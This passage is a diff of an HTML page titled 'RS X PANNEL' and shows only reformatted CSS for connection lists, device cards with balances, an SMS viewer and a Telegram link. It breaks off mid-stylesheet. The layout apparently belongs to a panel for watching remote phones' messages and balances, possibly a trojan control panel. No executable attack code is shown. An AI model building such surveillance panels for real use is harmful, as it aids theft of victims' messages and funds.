@@ -1,1864 +1,835 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>RS X PANNEL</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com" />
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        :root {
-            --bg: #080b12;
-            --bg2: #0d111a;
-            --bg3: #141a26;
-            --bg4: #1c2332;
-            --border: #1f293f;
-            --border2: #2c3852;
-            --text: #eef2f8;
-            --muted: #8892a8;
-            --dim: #3d4a60;
-            --red: #ff4d4d;
-            --green: #00d68f;
-            --cyan: #18bfff;
-            --gold: #f6cf45;
-            --shadow: 0 18px 60px rgba(0, 0, 0, 0.7);
-            --radius: 14px;
-            --font: 'Inter', system-ui, -apple-system, sans-serif;
-        }
-        html,
-        body {
-            height: 100%;
-            background: var(--bg);
-            color: var(--text);
-            font-family: var(--font);
-            -webkit-font-smoothing: antialiased;
-        }
-        ::-webkit-scrollbar {
-            width: 4px;
-            height: 4px;
-        }
-        ::-webkit-scrollbar-track {
-            background: var(--bg2);
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--dim);
-            border-radius: 4px;
-        }
-        button {
-            cursor: pointer;
-            font-family: inherit;
-        }
-        input,
-        textarea {
-            font-family: inherit;
-            outline: none;
-        }
-        a {
-            color: inherit;
-            text-decoration: none;
-        }
-        .hidden {
-            display: none !important;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RS X PANNEL</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <style>
+    /* ─── RESET ────────────────────────────────────────────────────── */
+    *{margin:0;padding:0;box-sizing:border-box}
+    :root{--bg:#080b12;--bg2:#0d111a;--bg3:#141a26;--bg4:#1c2332;--border:#1f293f;--border2:#2c3852;--text:#eef2f8;--muted:#8892a8;--dim:#3d4a60;--red:#ff4d4d;--green:#00d68f;--cyan:#18bfff;--gold:#f6cf45;--shadow:0 18px 60px rgba(0,0,0,0.7);--radius:14px;--font:'Inter',system-ui,sans-serif}
+    html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--font);-webkit-font-smoothing:antialiased}
+    ::-webkit-scrollbar{width:4px;height:4px}
+    ::-webkit-scrollbar-track{background:var(--bg2)}
+    ::-webkit-scrollbar-thumb{background:var(--dim);border-radius:4px}
+    button{cursor:pointer;font-family:inherit}
+    input,textarea{font-family:inherit;outline:none}
+    a{color:inherit;text-decoration:none}
+    .hidden{display:none!important}
+    .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--bg3);border:1px solid var(--border2);padding:12px 28px;border-radius:16px;color:var(--text);font-size:13px;font-weight:600;z-index:99999;box-shadow:var(--shadow);backdrop-filter:blur(12px);opacity:0;transition:all .3s cubic-bezier(.34,1.56,.64,1);pointer-events:none;white-space:nowrap}
+    .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+    .toast.error{border-color:rgba(255,77,77,0.3);color:var(--red)}
+    .toast.success{border-color:rgba(0,214,143,0.25);color:var(--green)}
 
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%) translateY(20px);
-            background: var(--bg3);
-            border: 1px solid var(--border2);
-            padding: 12px 28px;
-            border-radius: 16px;
-            color: var(--text);
-            font-size: 13px;
-            font-weight: 600;
-            z-index: 99999;
-            box-shadow: var(--shadow);
-            backdrop-filter: blur(12px);
-            opacity: 0;
-            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
-            pointer-events: none;
-            white-space: nowrap;
-        }
-        .toast.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-        }
-        .toast.error {
-            border-color: rgba(255, 77, 77, 0.3);
-            color: var(--red);
-        }
-        .toast.success {
-            border-color: rgba(0, 214, 143, 0.25);
-            color: var(--green);
-        }
+    /* ─── HOME ──────────────────────────────────────────────────────── */
+    .screen{min-height:100vh;display:grid;place-items:center;padding:24px}
+    .shell{width:min(100%,560px)}
+    .brand{text-align:center}
+    .brand .logo{width:72px;height:72px;border-radius:20px;background:linear-gradient(145deg,#ff3a2e,#c62913);display:grid;place-items:center;margin:0 auto 20px;box-shadow:0 0 40px rgba(255,50,35,0.25)}
+    .brand .logo svg{width:36px;height:36px;fill:none;stroke:#fff;stroke-width:2.5}
+    .brand h1{font-size:38px;font-weight:900;letter-spacing:-1px}
+    .brand h1 span{color:var(--cyan)}
+    .brand p{color:var(--muted);margin-top:6px;font-size:15px}
+    .card{background:rgba(13,17,26,0.94);border:1px solid var(--border);border-radius:24px;box-shadow:var(--shadow);backdrop-filter:blur(16px);padding:28px;margin-top:30px}
+    .card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+    .card-header h3{font-weight:700;font-size:16px}
+    .card-header .badge{background:var(--bg3);color:var(--muted);padding:6px 14px;border-radius:999px;font-size:12px}
+    .conn-item{display:flex;align-items:center;gap:12px;padding:14px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:16px;margin-bottom:10px}
+    .conn-item .info{flex:1;min-width:0}
+    .conn-item .info .name{font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .conn-item .info .date{color:var(--muted);font-size:12px;margin-top:2px}
+    .conn-item button{width:34px;height:34px;border-radius:50%;border:1px solid var(--border2);background:var(--bg3);color:#aaa;display:grid;place-items:center;font-size:16px;transition:.15s}
+    .conn-item button:hover{border-color:var(--muted)}
+    .conn-item .connect{color:var(--green);border-color:rgba(0,214,143,0.25)}
+    .conn-item .connect:hover{border-color:var(--green);background:rgba(0,214,143,0.08)}
+    .conn-item .del{color:var(--red);border-color:rgba(255,77,77,0.2)}
+    .conn-item .del:hover{border-color:var(--red);background:rgba(255,77,77,0.08)}
+    .btn-new{width:100%;padding:14px;border:1px dashed var(--border2);border-radius:16px;background:transparent;color:var(--muted);margin-top:16px;font-size:14px;transition:.2s}
+    .btn-new:hover{border-color:var(--muted);color:var(--text)}
+    .footer-text{text-align:center;color:var(--dim);font-size:12px;margin-top:30px;letter-spacing:.5px}
 
-        /* ─── HOME SCREEN ────────────────────────────────────────────── */
-        .screen {
-            min-height: 100vh;
-            display: grid;
-            place-items: center;
-            padding: 24px;
-        }
-        .shell {
-            width: min(100%, 560px);
-        }
-        .brand {
-            text-align: center;
-        }
-        .brand .logo {
-            width: 72px;
-            height: 72px;
-            border-radius: 20px;
-            background: linear-gradient(145deg, #ff3a2e, #c62913);
-            display: grid;
-            place-items: center;
-            margin: 0 auto 20px;
-            box-shadow: 0 0 40px rgba(255, 50, 35, 0.25);
-        }
-        .brand .logo svg {
-            width: 36px;
-            height: 36px;
-            fill: none;
-            stroke: #fff;
-            stroke-width: 2.5;
-        }
-        .brand h1 {
-            font-size: 38px;
-            font-weight: 900;
-            letter-spacing: -1px;
-        }
-        .brand h1 span {
-            color: var(--cyan);
-        }
-        .brand p {
-            color: var(--muted);
-            margin-top: 6px;
-            font-size: 15px;
-        }
+    /* ─── MODAL ────────────────────────────────────────────────────── */
+    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.88);backdrop-filter:blur(12px);z-index:9999;padding:20px;overflow-y:auto;display:none}
+    .modal-overlay.active{display:block}
+    .modal-box{max-width:560px;margin:20px auto;background:var(--bg2);border:1px solid var(--border2);border-radius:24px;padding:28px;animation:modalIn .2s ease}
+    @keyframes modalIn{from{opacity:0;transform:scale(.96) translateY(12px)}to{opacity:1;transform:scale(1) translateY(0)}}
+    .modal-header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--border);padding-bottom:16px;margin-bottom:20px}
+    .modal-header h2{font-size:20px;font-weight:800}
+    .modal-header .close{background:none;border:0;color:var(--muted);font-size:28px;cursor:pointer;padding:0 4px}
+    .modal-header .close:hover{color:var(--red)}
+    .form-group{margin-bottom:18px}
+    .form-group label{display:block;color:var(--muted);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px}
+    .form-group input,.form-group textarea{width:100%;padding:12px 16px;border:1px solid var(--border);border-radius:14px;background:var(--bg3);color:var(--text);font-size:14px;transition:.2s}
+    .form-group input:focus,.form-group textarea:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(24,191,255,0.08)}
+    .form-group textarea{resize:vertical;min-height:80px}
+    .form-actions{display:flex;gap:12px;margin-top:24px}
+    .form-actions .primary{flex:1;border:0;border-radius:14px;padding:15px;font-weight:700;background:linear-gradient(90deg,#ff3027,#df3a08);color:#fff;box-shadow:0 8px 25px rgba(255,49,30,0.18);font-size:14px}
+    .form-actions .primary:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(255,49,30,0.3)}
+    .form-actions .secondary{border:0;border-radius:14px;padding:15px 20px;background:var(--bg3);color:var(--muted);font-size:14px;font-weight:600}
+    .form-actions .secondary:hover{color:var(--text)}
+    .error-text{color:var(--red);text-align:center;font-size:13px;margin-top:14px}
+    .file-upload{border:1px dashed var(--border2);border-radius:14px;padding:20px;text-align:center;color:var(--muted);cursor:pointer;transition:.2s}
+    .file-upload:hover{border-color:var(--muted);color:var(--text)}
+    .file-upload input[type="file"]{display:none}
 
-        .card {
-            background: rgba(13, 17, 26, 0.94);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            box-shadow: var(--shadow);
-            backdrop-filter: blur(16px);
-            padding: 28px;
-            margin-top: 30px;
-        }
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        .card-header h3 {
-            font-weight: 700;
-            font-size: 16px;
-        }
-        .card-header .badge {
-            background: var(--bg3);
-            color: var(--muted);
-            padding: 6px 14px;
-            border-radius: 999px;
-            font-size: 12px;
-        }
+    /* ─── DASHBOARD ────────────────────────────────────────────────── */
+    .dashboard{display:none;min-height:100vh}
+    .topbar{height:68px;border-bottom:1px solid var(--border);background:rgba(8,11,18,0.94);backdrop-filter:blur(12px);display:flex;align-items:center;gap:18px;padding:0 24px;position:sticky;top:0;z-index:50}
+    .topbar .logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:16px;letter-spacing:2px;white-space:nowrap}
+    .topbar .logo .dot{width:28px;height:28px;border-radius:8px;background:linear-gradient(145deg,#ff3a2e,#c62913);display:grid;place-items:center;box-shadow:0 0 18px rgba(255,50,35,0.2);font-size:12px;color:#fff}
+    .topbar .search{flex:1;max-width:400px}
+    .topbar .search input{height:40px;border-radius:12px;border:1px solid var(--border);background:var(--bg2);color:var(--text);padding:0 14px;width:100%;font-size:13px}
+    .topbar .search input:focus{border-color:var(--cyan)}
+    .topbar .actions{display:flex;align-items:center;gap:10px;margin-left:auto}
+    .topbar .actions .status{padding:6px 14px;border:1px solid rgba(0,214,143,0.2);border-radius:999px;color:var(--green);background:rgba(0,214,143,0.06);font-size:12px;font-weight:700;white-space:nowrap}
+    .topbar .actions .telegram{width:38px;height:38px;border-radius:50%;background:rgba(24,191,255,0.06);border:1px solid rgba(24,191,255,0.15);display:grid;place-items:center;transition:.2s}
+    .topbar .actions .telegram:hover{background:rgba(24,191,255,0.12);border-color:rgba(24,191,255,0.3)}
+    .topbar .actions .telegram svg{width:20px;fill:#25bdf4}
+    .topbar .actions .time{color:var(--muted);font-size:13px;font-weight:600;font-variant-numeric:tabular-nums;min-width:50px;text-align:center}
+    .topbar .actions .btn-icon{background:var(--bg2);border:1px solid var(--border);color:var(--muted);border-radius:10px;padding:8px 12px;font-size:14px;transition:.15s}
+    .topbar .actions .btn-icon:hover{border-color:var(--border2);color:var(--text)}
+    .topbar .actions .logout{background:var(--bg2);border:1px solid var(--border);color:var(--muted);border-radius:10px;padding:8px 14px;font-size:12px;font-weight:600}
+    .topbar .actions .logout:hover{border-color:var(--red);color:var(--red)}
+    .statsbar{display:flex;gap:28px;padding:16px 26px;border-bottom:1px solid var(--border);overflow-x:auto}
+    .stat-item{min-width:60px}
+    .stat-item small{display:block;color:var(--dim);font-size:10px;font-weight:800;letter-spacing:.08em;text-transform:uppercase}
+    .stat-item strong{display:block;margin-top:4px;font-size:22px;font-weight:800}
+    .stat-item .green{color:var(--green)}
+    .stat-item .red{color:var(--red)}
+    .stat-item .cyan{color:var(--cyan)}
+    .stat-item .gold{color:var(--gold)}
+    .filters{display:flex;gap:6px;align-items:center;padding:12px 26px;overflow-x:auto;border-bottom:1px solid var(--border)}
+    .filters .filter{background:transparent;border:0;color:var(--muted);padding:6px 14px;border-radius:10px;font-size:12px;font-weight:600;white-space:nowrap;transition:.15s}
+    .filters .filter:hover{color:var(--text)}
+    .filters .filter.active{background:rgba(255,77,77,0.12);color:var(--red);border:1px solid rgba(255,77,77,0.2)}
+    .filters .sort{margin-left:auto;background:var(--bg2);border:1px solid var(--border);color:var(--muted);padding:6px 14px;border-radius:10px;font-size:12px;font-weight:600}
+    .filters .sort:hover{border-color:var(--border2);color:var(--text)}
+    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;padding:16px 26px 30px}
+    .device-card{background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:18px;cursor:pointer;transition:.15s ease;min-height:220px;position:relative}
+    .device-card:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,0,0,0.3)}
+    .device-card .top{display:flex;gap:12px;align-items:flex-start}
+    .device-card .icon{width:42px;height:42px;border-radius:12px;border:1px solid var(--border);background:var(--bg3);display:grid;place-items:center;font-size:18px;color:var(--muted);flex-shrink:0}
+    .device-card .icon.online{color:var(--green);border-color:rgba(0,214,143,0.25);background:rgba(0,214,143,0.06);box-shadow:0 0 18px rgba(0,214,143,0.06)}
+    .device-card .info{flex:1;min-width:0}
+    .device-card .info .name{font-weight:700;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .device-card .info .sub{font-size:11px;color:var(--muted);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .device-card .info .sub span{margin-right:8px}
+    .device-card .balance{margin-top:12px;padding:8px 12px;background:rgba(0,214,143,0.06);border:1px solid rgba(0,214,143,0.12);border-radius:8px;font-size:16px;font-weight:700;color:var(--green);display:flex;justify-content:space-between}
+    .device-card .balance .label{font-weight:400;color:var(--muted);font-size:11px}
+    .device-card .details{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px}
+    .device-card .details .item small{display:block;color:var(--dim);font-size:9px;font-weight:800;letter-spacing:.06em;text-transform:uppercase}
+    .device-card .details .item div{margin-top:2px;color:var(--text);font-size:12px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .online-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);margin-right:6px}
+    .offline-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--dim);margin-right:6px}
+    .empty-grid{grid-column:1/-1;text-align:center;color:var(--muted);padding:70px 0;font-size:14px}
+    .send-btn-small{position:absolute;top:12px;right:12px;background:rgba(24,191,255,0.08);border:1px solid rgba(24,191,255,0.15);border-radius:8px;color:var(--cyan);padding:4px 10px;font-size:14px;cursor:pointer;transition:.15s;opacity:.5;z-index:2}
+    .send-btn-small:hover{opacity:1;background:rgba(24,191,255,0.15)}
 
-        .conn-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 14px 16px;
-            background: var(--bg2);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            margin-bottom: 10px;
-        }
-        .conn-item .info {
-            flex: 1;
-            min-width: 0;
-        }
-        .conn-item .info .name {
-            font-weight: 600;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .conn-item .info .date {
-            color: var(--muted);
-            font-size: 12px;
-            margin-top: 2px;
-        }
-        .conn-item button {
-            width: 34px;
-            height: 34px;
-            border-radius: 50%;
-            border: 1px solid var(--border2);
-            background: var(--bg3);
-            color: #aaa;
-            display: grid;
-            place-items: center;
-            font-size: 16px;
-            transition: 0.15s;
-        }
-        .conn-item button:hover {
-            border-color: var(--muted);
-        }
-        .conn-item .connect {
-            color: var(--green);
-            border-color: rgba(0, 214, 143, 0.25);
-        }
-        .conn-item .connect:hover {
-            border-color: var(--green);
-            background: rgba(0, 214, 143, 0.08);
-        }
-        .conn-item .del {
-            color: var(--red);
-            border-color: rgba(255, 77, 77, 0.2);
-        }
-        .conn-item .del:hover {
-            border-color: var(--red);
-            background: rgba(255, 77, 77, 0.08);
-        }
-
-        .btn-new {
-            width: 100%;
-            padding: 14px;
-            border: 1px dashed var(--border2);
-            border-radius: 16px;
-            background: transparent;
-            color: var(--muted);
-            margin-top: 16px;
-            font-size: 14px;
-            transition: 0.2s;
-        }
-        .btn-new:hover {
-            border-color: var(--muted);
-            color: var(--text);
-        }
-
-        .footer-text {
-            text-align: center;
-            color: var(--dim);
-            font-size: 12px;
-            margin-top: 30px;
-            letter-spacing: 0.5px;
-        }
-
-        /* ─── NEW ACCOUNT MODAL ──────────────────────────────────────── */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.88);
-            backdrop-filter: blur(12px);
-            z-index: 9999;
-            padding: 20px;
-            overflow-y: auto;
-            display: none;
-        }
-        .modal-overlay.active {
-            display: block;
-        }
-        .modal-box {
-            max-width: 560px;
-            margin: 20px auto;
-            background: var(--bg2);
-            border: 1px solid var(--border2);
-            border-radius: 24px;
-            padding: 28px;
-            animation: modalIn 0.2s ease;
-        }
-        @keyframes modalIn {
-            from {
-                opacity: 0;
-                transform: scale(0.96) translateY(12px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid var(--border);
-            padding-bottom: 16px;
-            margin-bottom: 20px;
-        }
-        .modal-header h2 {
-            font-size: 20px;
-            font-weight: 800;
-        }
-        .modal-header .close {
-            background: none;
-            border: 0;
-            color: var(--muted);
-            font-size: 28px;
-            cursor: pointer;
-            padding: 0 4px;
-        }
-        .modal-header .close:hover {
-            color: var(--red);
-        }
-
-        .form-group {
-            margin-bottom: 18px;
-        }
-        .form-group label {
-            display: block;
-            color: var(--muted);
-            font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            margin-bottom: 6px;
-        }
-        .form-group input,
-        .form-group textarea {
-            width: 100%;
-            padding: 12px 16px;
-            border: 1px solid var(--border);
-            border-radius: 14px;
-            background: var(--bg3);
-            color: var(--text);
-            font-size: 14px;
-            transition: 0.2s;
-        }
-        .form-group input:focus,
-        .form-group textarea:focus {
-            border-color: var(--cyan);
-            box-shadow: 0 0 0 3px rgba(24, 191, 255, 0.08);
-        }
-        .form-group textarea {
-            resize: vertical;
-            min-height: 80px;
-        }
-        .form-actions {
-            display: flex;
-            gap: 12px;
-            margin-top: 24px;
-        }
-        .form-actions .primary {
-            flex: 1;
-            border: 0;
-            border-radius: 14px;
-            padding: 15px;
-            font-weight: 700;
-            background: linear-gradient(90deg, #ff3027, #df3a08);
-            color: #fff;
-            box-shadow: 0 8px 25px rgba(255, 49, 30, 0.18);
-            font-size: 14px;
-        }
-        .form-actions .primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(255, 49, 30, 0.3);
-        }
-        .form-actions .secondary {
-            border: 0;
-            border-radius: 14px;
-            padding: 15px 20px;
-            background: var(--bg3);
-            color: var(--muted);
-            font-size: 14px;
-            font-weight: 600;
-        }
-        .form-actions .secondary:hover {
-            color: var(--text);
-        }
-        .error-text {
-            color: var(--red);
-            text-align: center;
-            font-size: 13px;
-            margin-top: 14px;
-        }
-        .file-upload {
-            border: 1px dashed var(--border2);
-            border-radius: 14px;
-            padding: 20px;
-            text-align: center;
-            color: var(--muted);
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .file-upload:hover {
-            border-color: var(--muted);
-            color: var(--text);
-        }
-        .file-upload input[type="file"] {
-            display: none;
-        }
-
-        /* ─── DASHBOARD ──────────────────────────────────────────────── */
-        .dashboard {
-            display: none;
-            min-height: 100vh;
-        }
-        .topbar {
-            height: 68px;
-            border-bottom: 1px solid var(--border);
-            background: rgba(8, 11, 18, 0.94);
-            backdrop-filter: blur(12px);
-            display: flex;
-            align-items: center;
-            gap: 18px;
-            padding: 0 24px;
-            position: sticky;
-            top: 0;
-            z-index: 50;
-        }
-        .topbar .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-weight: 800;
-            font-size: 16px;
-            letter-spacing: 2px;
-            white-space: nowrap;
-        }
-        .topbar .logo .dot {
-            width: 28px;
-            height: 28px;
-            border-radius: 8px;
-            background: linear-gradient(145deg, #ff3a2e, #c62913);
-            display: grid;
-            place-items: center;
-            box-shadow: 0 0 18px rgba(255, 50, 35, 0.2);
-            font-size: 12px;
-            color: #fff;
-        }
-        .topbar .search {
-            flex: 1;
-            max-width: 400px;
-        }
-        .topbar .search input {
-            height: 40px;
-            border-radius: 12px;
-            border: 1px solid var(--border);
-            background: var(--bg2);
-            color: var(--text);
-            padding: 0 14px;
-            width: 100%;
-            font-size: 13px;
-        }
-        .topbar .search input:focus {
-            border-color: var(--cyan);
-        }
-        .topbar .actions {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-left: auto;
-        }
-        .topbar .actions .status {
-            padding: 6px 14px;
-            border: 1px solid rgba(0, 214, 143, 0.2);
-            border-radius: 999px;
-            color: var(--green);
-            background: rgba(0, 214, 143, 0.06);
-            font-size: 12px;
-            font-weight: 700;
-            white-space: nowrap;
-        }
-        .topbar .actions .telegram {
-            width: 38px;
-            height: 38px;
-            border-radius: 50%;
-            background: rgba(24, 191, 255, 0.06);
-            border: 1px solid rgba(24, 191, 255, 0.15);
-            display: grid;
-            place-items: center;
-            transition: 0.2s;
-        }
-        .topbar .actions .telegram:hover {
-            background: rgba(24, 191, 255, 0.12);
-            border-color: rgba(24, 191, 255, 0.3);
-        }
-        .topbar .actions .telegram svg {
-            width: 20px;
-            fill: #25bdf4;
-        }
-        .topbar .actions .btn-icon {
-            background: var(--bg2);
-            border: 1px solid var(--border);
-            color: var(--muted);
-            border-radius: 10px;
-            padding: 8px 12px;
-            font-size: 14px;
-            transition: 0.15s;
-        }
-        .topbar .actions .btn-icon:hover {
-            border-color: var(--border2);
-            color: var(--text);
-        }
-        .topbar .actions .logout {
-            background: var(--bg2);
-            border: 1px solid var(--border);
-            color: var(--muted);
-            border-radius: 10px;
-            padding: 8px 14px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-        .topbar .actions .logout:hover {
-            border-color: var(--red);
-            color: var(--red);
-        }
-
-        .statsbar {
-            display: flex;
-            gap: 28px;
-            padding: 16px 26px;
-            border-bottom: 1px solid var(--border);
-            overflow-x: auto;
-        }
-        .stat-item {
-            min-width: 60px;
-        }
-        .stat-item small {
-            display: block;
-            color: var(--dim);
-            font-size: 10px;
-            font-weight: 800;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-        }
-        .stat-item strong {
-            display: block;
-            margin-top: 4px;
-            font-size: 22px;
-            font-weight: 800;
-        }
-        .stat-item .green {
-            color: var(--green);
-        }
-        .stat-item .red {
-            color: var(--red);
-        }
-        .stat-item .cyan {
-            color: var(--cyan);
-        }
-        .stat-item .gold {
-            color: var(--gold);
-        }
-
-        .filters {
-            display: flex;
-            gap: 6px;
-            align-items: center;
-            padding: 12px 26px;
-            overflow-x: auto;
-            border-bottom: 1px solid var(--border);
-        }
-        .filters .filter {
-            background: transparent;
-            border: 0;
-            color: var(--muted);
-            padding: 6px 14px;
-            border-radius: 10px;
-            font-size: 12px;
-            font-weight: 600;
-            white-space: nowrap;
-            transition: 0.15s;
-        }
-        .filters .filter:hover {
-            color: var(--text);
-        }
-        .filters .filter.active {
-            background: rgba(255, 77, 77, 0.12);
-            color: var(--red);
-            border: 1px solid rgba(255, 77, 77, 0.2);
-        }
-        .filters .sort {
-            margin-left: auto;
-            background: var(--bg2);
-            border: 1px solid var(--border);
-            color: var(--muted);
-            padding: 6px 14px;
-            border-radius: 10px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-        .filters .sort:hover {
-            border-color: var(--border2);
-            color: var(--text);
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 16px;
-            padding: 16px 26px 30px;
-        }
-
-        .device-card {
-            background: var(--bg2);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 18px;
-            cursor: pointer;
-            transition: 0.15s ease;
-            min-height: 220px;
-            position: relative;
-        }
-        .device-card:hover {
-            border-color: var(--border2);
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
-        }
-        .device-card .top {
-            display: flex;
-            gap: 12px;
-            align-items: flex-start;
-        }
-        .device-card .icon {
-            width: 42px;
-            height: 42px;
-            border-radius: 12px;
-            border: 1px solid var(--border);
-            background: var(--bg3);
-            display: grid;
-            place-items: center;
-            font-size: 18px;
-            color: var(--muted);
-            flex-shrink: 0;
-        }
-        .device-card .icon.online {
-            color: var(--green);
-            border-color: rgba(0, 214, 143, 0.25);
-            background: rgba(0, 214, 143, 0.06);
-            box-shadow: 0 0 18px rgba(0, 214, 143, 0.06);
-        }
-        .device-card .info {
-            flex: 1;
-            min-width: 0;
-        }
-        .device-card .info .name {
-            font-weight: 700;
-            font-size: 14px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .device-card .info .sub {
-            font-size: 11px;
-            color: var(--muted);
-            margin-top: 2px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .device-card .info .sub span {
-            margin-right: 8px;
-        }
-        .device-card .balance {
-            margin-top: 12px;
-            padding: 8px 12px;
-            background: rgba(0, 214, 143, 0.06);
-            border: 1px solid rgba(0, 214, 143, 0.12);
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 700;
-            color: var(--green);
-            display: flex;
-            justify-content: space-between;
-        }
-        .device-card .balance .label {
-            font-weight: 400;
-            color: var(--muted);
-            font-size: 11px;
-        }
-        .device-card .details {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-            margin-top: 12px;
-        }
-        .device-card .details .item small {
-            display: block;
-            color: var(--dim);
-            font-size: 9px;
-            font-weight: 800;
-            letter-spacing: 0.06em;
-            text-transform: uppercase;
-        }
-        .device-card .details .item div {
-            margin-top: 2px;
-            color: var(--text);
-            font-size: 12px;
-            font-weight: 500;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .online-dot {
-            display: inline-block;
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: var(--green);
-            box-shadow: 0 0 10px var(--green);
-            margin-right: 6px;
-        }
-        .offline-dot {
-            display: inline-block;
-            width: 7px;
-            height: 7px;
-            border-radius: 50%;
-            background: var(--dim);
-            margin-right: 6px;
-        }
-        .empty-grid {
-            grid-column: 1 / -1;
-            text-align: center;
-            color: var(--muted);
-            padding: 70px 0;
-            font-size: 14px;
-        }
-        .send-btn-small {
-            position: absolute;
-            top: 12px;
-            right: 12px;
-            background: rgba(24, 191, 255, 0.08);
-            border: 1px solid rgba(24, 191, 255, 0.15);
-            border-radius: 8px;
-            color: var(--cyan);
-            padding: 4px 10px;
-            font-size: 14px;
-            cursor: pointer;
-            transition: 0.15s;
-            opacity: 0.5;
-            z-index: 2;
-        }
-        .send-btn-small:hover {
-            opacity: 1;
-            background: rgba(24, 191, 255, 0.15);
-        }
-
-        /* ─── DETAIL MODAL ───────────────────────────────────────────── */
-        .detail-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 14px;
-            margin-bottom: 24px;
-        }
-        .detail-item {
-            padding: 14px 16px;
-            background: var(--bg3);
-            border-radius: 12px;
-            border: 1px solid var(--border);
-        }
-        .detail-item .label {
-            color: var(--dim);
-            font-size: 10px;
-            font-weight: 800;
-            text-transform: uppercase;
-            letter-spacing: 0.06em;
-            margin-bottom: 4px;
-        }
-        .detail-item .value {
-            color: var(--text);
-            font-size: 15px;
-            font-weight: 600;
-            word-break: break-word;
-        }
-
-        .sms-section h3 {
-            color: var(--muted);
-            font-size: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            margin-bottom: 12px;
-            display: flex;
-            gap: 16px;
-            align-items: center;
-        }
-        .sms-section h3 .count {
-            color: var(--dim);
-            font-weight: 400;
-            font-size: 11px;
-        }
-        .sms-section .sms-search {
-            margin-bottom: 12px;
-            display: flex;
-            gap: 8px;
-        }
-        .sms-section .sms-search input {
-            flex: 1;
-            padding: 8px 12px;
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            background: var(--bg3);
-            color: var(--text);
-            font-size: 13px;
-        }
-        .sms-section .sms-search input:focus {
-            border-color: var(--cyan);
-        }
-        .sms-item {
-            padding: 12px 16px;
-            background: var(--bg3);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            margin-bottom: 8px;
-        }
-        .sms-item .sms-header {
-            display: flex;
-            justify-content: space-between;
-            color: var(--dim);
-            font-size: 11px;
-            margin-bottom: 4px;
-        }
-        .sms-item .sms-body {
